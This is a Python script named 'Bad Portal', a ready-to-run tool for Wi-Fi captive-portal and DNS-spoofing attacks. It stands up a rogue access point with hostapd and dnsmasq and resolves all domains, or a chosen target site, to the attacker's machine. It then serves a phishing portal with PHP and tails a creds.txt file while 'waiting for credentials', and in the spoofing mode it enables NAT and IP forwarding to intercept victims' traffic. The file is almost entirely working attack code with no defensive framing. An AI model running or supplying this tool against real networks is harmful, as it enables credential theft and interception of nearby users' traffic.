#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import time

try: 
	print('''\x1b[1;31m 
\x1b[1;32m ______           __ \x1b[1;33m______              __          __ 
\x1b[1;32m|   __ \.---.-.--|  |\x1b[1;33m   __ \.-----.----.|  |_.---.-.|  |
\x1b[1;32m|   __ <|  _  |  _  |\x1b[1;33m    __/|  _  |   _||   _|  _  ||  |
\x1b[1;32m|______/|___._|_____|\x1b[1;33m___|   |_____|__|  |____|___._||__|
              \x1b[1;31mC A P T I V E  P O R T A L  A T T A C K S 
\x1b[1;37m-------------------------------------------------------- 
        \x1b[1;37mBy Raphael Molina : \x1b[1;32m@Raphael_Mol \x1b[1;33mv1.0  
\x1b[1;37m--------------------------------------------------------
		''')

	print
	print('\x1b[1;31m[1] \x1b[1;37mCaptive Portal')
	print('\x1b[1;31m[2] \x1b[1;37mDNS Spoofing')
	print

	el = int(input("\x1b[1;33m>>\x1b[1;37m "))
	if el == 1:
		
		os.system('service dnsmasq stop > /dev/null 2>&1')
		os.system('sudo hostapd stop > /dev/null 2>&1')
		print
		elec = raw_input("\x1b[1;33mStart Monitor-Mode? (y/n) >>\x1b[1;37m ")
		if elec == 'y':
			os.system('iwconfig')
			tarjeta = raw_input("\x1b[1;33mEnter the Interface Name: >>\x1b[1;37m ")
			s1="""airmon-ng start """
			arr="{0}{1}"
			start_monitor=arr.format(s1, tarjeta)
			print
			print('\x1b[1;31mStarting Monitor Mode...')
			os.system('airmon-ng check kill')
			os.system(start_monitor)
		else: 
			print('OK')
			time.sleep(1)

		os.system('clear')	
		os.system('iwconfig')
		interface = raw_input("\x1b[1;33mEnter the Interface Name: (In Monitor Mode): >>\x1b[1;37m ")
		ssid = raw_input("\x1b[1;33mName for the New Network: >>\x1b[1;37m ")
		channel = raw_input("\x1b[1;33mChannel (1-12): >>\x1b[1;37m ")
		plantilla = raw_input("\x1b[1;33mCaptive Portal Directory: >>\x1b[1;37m ")

		directory = plantilla.split('/')
		ruta = (directory[-1])
		
		st1="""echo interface="""
		st2=(interface)
		st3=""" > """
		st4="""d.conf"""
		st5="""h.conf"""
		st6="""echo ssid="""
		st7=""" >> """
		st8="""echo channel="""
		st9="""ifconfig """
		st10=""" up 192.168.1.1 netmask 255.255.255.0"""
		st11="""cd """
		st12="""; php -S 192.168.1.1:80 > /dev/null 2>&1 &"""
		st13="""tail -f """
		st14="""/creds.txt"""
		st15=""" down"""
		st16="""iwconfig """
		st17=""" """
		st18="""mode monitor"""
		st19=""" up"""
		st20="""airmon-ng stop """
		st21=""" > /dev/null 2>&1"""

		arr1="{0}{1}{2}{3}"
		interfacequery= arr1.format(st1, st2, st3, st4)

		arr2="{0}{1}{2}{3}"
		interfacequery2= arr2.format(st1, st2, st3, st5)

		arr3="{0}{1}{2}{3}"
		ssid_name=arr3.format(st6, ssid, st7, st5)

		arr4="{0}{1}{2}{3}"
		channel_num=arr4.format(st8, channel, st7, st5)

		arr5="{0}{1}{2}"
		config_network=arr5.format(st9, interface, st10)

		arr6="{0}{1}{2}"
		webserver_start=arr6.format(st11, plantilla, st12)	

		arr7="{0}{1}{2}"
		view_creds=arr7.format(st13, plantilla, st14)

		arr8="{0}{1}{2}"
		iface_down=arr8.format(st9, st2, st15)

		arr9="{0}{1}{2}{3}"
		mode_mon=arr9.format(st16, st2, st17, st18)

		arr10="{0}{1}{2}"
		iface_up=arr10.format(st9, st2, st19)

		arr11="{0}{1}{2}"
		iface_stop=arr11.format(st20, st2, st21)

		os.system(interfacequery)
		os.system('echo dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h >> d.conf')
		os.system('echo dhcp-option=3,192.168.1.1 >> d.conf')
		os.system('echo dhcp-option=6,192.168.1.1 >> d.conf')
		os.system('echo server=8.8.8.8 >> d.conf')
		os.system('echo log-queries >> d.conf')
		os.system('echo log-dhcp >> d.conf')
		os.system('echo listen-address=127.0.0.1 >> d.conf')
		os.system('echo address=/#/192.168.1.1 >> d.conf')

		print
		elec2 = raw_input("\x1b[1;33mDo You Want to Set Password? (y/n) >>\x1b[1;37m ")
		if elec2 == 'y':
			passportal = raw_input("Enter the password (+7 Characters): >>\x1b[1;37m ")
			st22="""echo wpa_passphrase="""
			arr12="{0}{1}{2}{3}"
			set_pass=arr12.format(st22, passportal, st7, st5)

			os.system(interfacequery2)
			os.system('echo driver=nl80211 >> h.conf')
			os.system(ssid_name)
			os.system('echo hw_mode=g >> h.conf')
			os.system(channel_num)
			os.system('echo macaddr_acl=0 >> h.conf')
			os.system('echo auth_algs=1 >> h.conf')
			os.system('echo ignore_broadcast_ssid=0 >> h.conf')
			os.system('echo wpa=2 >> h.conf')
			os.system(set_pass)
			os.system('echo wpa_key_mgmt=WPA-PSK >> h.conf')
			os.system('echo wpa_pairwise=CCMP >> h.conf')
		
		else:
			os.system(interfacequery2)
			os.system('echo driver=nl80211 >> h.conf')
			os.system(ssid_name)
			os.system('echo hw_mode=g >> h.conf')
			os.system(channel_num)
			os.system('echo macaddr_acl=0 >> h.conf')
			os.system('echo auth_algs=1 >> h.conf')
			os.system('echo ignore_broadcast_ssid=0 >> h.conf')

		print
		os.system('clear')
		print("""\x1b[1;31mStarting Access Point...""")
		print
		os.system('hostapd h.conf > /dev/null 2>&1 &')
		time.sleep(6)
		os.system(config_network)
		time.sleep(1)
		print("""\x1b[1;31mStarting Network...""")
		print
		os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
		time.sleep(1)
		os.system('dnsmasq -C d.conf -d > /dev/null 2>&1 &')
		time.sleep(5)
		print("""\x1b[1;31mStarting Bad Portal...""")
		print
		os.system(webserver_start)
		time.sleep(3)
		os.system('clear')

		print('\x1b[1;37m|\x1b[1;36mINTERFACE: \x1b[1;31m%s\x1b[1;37m| |\x1b[1;36mNETWORK: \
\x1b[1;31m%s\x1b[1;37m| |\x1b[1;36mCHANNEL: \x1b[1;31m%s\x1b[1;37m| |\x1b[1;36mDIR: \
\x1b[1;31m%s\x1b[1;37m|' % (interface, ssid, channel, ruta))
		print
		print
		print("""\x1b[1;32mPRESS CTRL+C TO STOP""")
		print("""\x1b[1;33mWAITING FOR CREDENTIALS...\x1b[1;37m""")
		print
		os.system(view_creds)

	elif el == 2:
		
		os.system('service dnsmasq stop > /dev/null 2>&1')
		os.system('sudo hostapd stop > /dev/null 2>&1')
		print
		elec = raw_input("\x1b[1;33mStart Monitor-Mode? (y/n) >>\x1b[1;37m ")
		if elec == 'y':
			os.system('iwconfig')
			tarjeta = raw_input("\x1b[1;33mEnter the Interface Name: >>\x1b[1;37m ")
			s1="""airmon-ng start """
			arr="{0}{1}"
			start_monitor=arr.format(s1, tarjeta)
			print
			print('\x1b[1;31mStarting Monitor Mode...')
			os.system('airmon-ng check kill')
			os.system(start_monitor)
		
		else: 
			print('OK')
			time.sleep(1)

		os.system('clear')	
		os.system('iwconfig')
		interface = raw_input("\x1b[1;33mEnter the Interface Name (In Monitor Mode): >>\x1b[1;37m ")
		ssid = raw_input("\x1b[1;33mName for the New Network: >>\x1b[1;37m ")
		channel = raw_input("\x1b[1;33mChannel (1-12): >>\x1b[1;37m ")
		plantilla = raw_input("\x1b[1;33mFile Path for Web Server: >>\x1b[1;37m ")
		website = raw_input("\x1b[1;33mEnter the Website to Spoof: >>\x1b[1;37m ")

		directory = plantilla.split('/')
		ruta = (directory[-1])
		
		st1="""echo interface="""
		st2=(interface)
		st3=""" > """
		st4="""d.conf"""
		st5="""h.conf"""
		st6="""echo ssid="""
		st7=""" >> """
		st8="""echo channel="""
		st9="""ifconfig """
		st10=""" up 192.168.1.1 netmask 255.255.255.0"""
		st11="""cd """
		st12="""; php -S 192.168.1.1:80 > /dev/null 2>&1 &"""
		st13="""tail -f """
		st14="""/creds.txt"""
		st15=""" down"""
		st16="""iwconfig """
		st17=""" """
		st18="""mode monitor"""
		st19=""" up"""
		st20="""airmon-ng stop """
		st21=""" > /dev/null 2>&1"""
		st22="""echo address=/"""
		st23="""/192.168.1.1 >> d.conf"""
		st24="""iptables --append FORWARD --in-interface """
		st25=""" -j ACCEPT"""

		arr1="{0}{1}{2}{3}"
		interfacequery= arr1.format(st1, st2, st3, st4)

		arr2="{0}{1}{2}{3}"
		interfacequery2= arr2.format(st1, st2, st3, st5)

		arr3="{0}{1}{2}{3}"
		ssid_name=arr3.format(st6, ssid, st7, st5)

		arr4="{0}{1}{2}{3}"
		channel_num=arr4.format(st8, channel, st7, st5)

		arr5="{0}{1}{2}"
		config_network=arr5.format(st9, interface, st10)

		arr6="{0}{1}{2}"
		webserver_start=arr6.format(st11, plantilla, st12)	

		arr7="{0}{1}{2}"
		view_creds=arr7.format(st13, plantilla, st14)

		arr8="{0}{1}{2}"
		iface_down=arr8.format(st9, st2, st15)

		arr9="{0}{1}{2}{3}"
		mode_mon=arr9.format(st16, st2, st17, st18)

		arr10="{0}{1}{2}"
		iface_up=arr10.format(st9, st2, st19)

		arr11="{0}{1}{2}"
		iface_stop=arr11.format(st20, st2, st21)

		arr12="{0}{1}{2}"
		iface_stop=arr11.format(st20, st2, st21)

		arr13="{0}{1}{2}"
		spoof=arr13.format(st22, website, st23)

		arr14="{0}{1}{2}"
		ip_tables=arr14.format(st24, interface, st25)

		os.system(interfacequery)
		os.system('echo dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h >> d.conf')
		os.system('echo dhcp-option=3,192.168.1.1 >> d.conf')
		os.system('echo dhcp-option=6,192.168.1.1 >> d.conf')
		os.system('echo server=8.8.8.8 >> d.conf')
		os.system('echo log-queries >> d.conf')
		os.system('echo log-dhcp >> d.conf')
		os.system('echo listen-address=127.0.0.1 >> d.conf')
		os.system(spoof)

		print
		elec2 = raw_input("\x1b[1;33mDo You Want to Set Password? (y/n) >>\x1b[1;37m ")
		if elec2 == 'y':
			passportal = raw_input("Enter the password (+7 Characters) >>\x1b[1;37m ")
			st22="""echo wpa_passphrase="""
			arr12="{0}{1}{2}{3}"
			set_pass=arr12.format(st22, passportal, st7, st5)

			os.system(interfacequery2)
			os.system('echo driver=nl80211 >> h.conf')
			os.system(ssid_name)
			os.system('echo hw_mode=g >> h.conf')
			os.system(channel_num)
			os.system('echo macaddr_acl=0 >> h.conf')
			os.system('echo auth_algs=1 >> h.conf')
			os.system('echo ignore_broadcast_ssid=0 >> h.conf')
			os.system('echo wpa=2 >> h.conf')
			os.system(set_pass)
			os.system('echo wpa_key_mgmt=WPA-PSK >> h.conf')
			os.system('echo wpa_pairwise=CCMP >> h.conf')
		
		else:
			os.system(interfacequery2)
			os.system('echo driver=nl80211 >> h.conf')
			os.system(ssid_name)
			os.system('echo hw_mode=g >> h.conf')
			os.system(channel_num)
			os.system('echo macaddr_acl=0 >> h.conf')
			os.system('echo auth_algs=1 >> h.conf')
			os.system('echo ignore_broadcast_ssid=0 >> h.conf')

		print
		os.system('clear')
		raw_input('Press Enter to Start...')
		os.system('clear')
		print("""\x1b[1;31mStarting Access Point...""")
		print
		
		os.system(config_network)
		time.sleep(1)
		print("""\x1b[1;31mStarting Network...""")
		print
		os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
		time.sleep(1)
		
		print("""\x1b[1;31mStarting DNS Spoofing...""")
		print
		os.system(webserver_start)
		time.sleep(3)
		#Cambiar la interfaz eth0 si no se corre en VM
		os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
		os.system(ip_tables)
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
		print('All Ready!!!...')
		os.system('clear')
		print('\x1b[1;37m|\x1b[1;36mINTERFACE: \x1b[1;31m%s\x1b[1;37m| |\x1b[1;36mNETWORK: \
\x1b[1;31m%s\x1b[1;37m| |\x1b[1;36mCHANNEL: \x1b[1;31m%s\x1b[1;37m| |\x1b[1;36mDIR: \
\x1b[1;31m%s\x1b[1;37m| \x1b[1;37m|\x1b[1;36mWEBSITE: \x1b[1;31m%s\x1b[1;37m|' % (interface, ssid, channel, ruta, website))
		print
		print
		print("""\x1b[1;32mPRESS CTRL+C TO STOP\x1b[1;37m""")
		print
		os.system('hostapd h.conf > /dev/null 2>&1 &')
		os.system('dnsmasq -C d.conf -d')

finally:

	print
	print('''\x1b[1;31mRestoring Network Card Settings...''')
	os.system('service hostapd stop')
	os.system('service dnsmasq stop')
	os.system(iface_down)
	os.system(mode_mon)
	os.system(iface_up)
	os.system(iface_stop)
	os.system('service network-manager restart > /dev/null 2>&1')
	time.sleep(2)
	os.system('rfkill unblock all')
	os.system('rm h.conf')
	os.system('rm d.conf')
	print('''\x1b[1;33mDone!!!''')
	print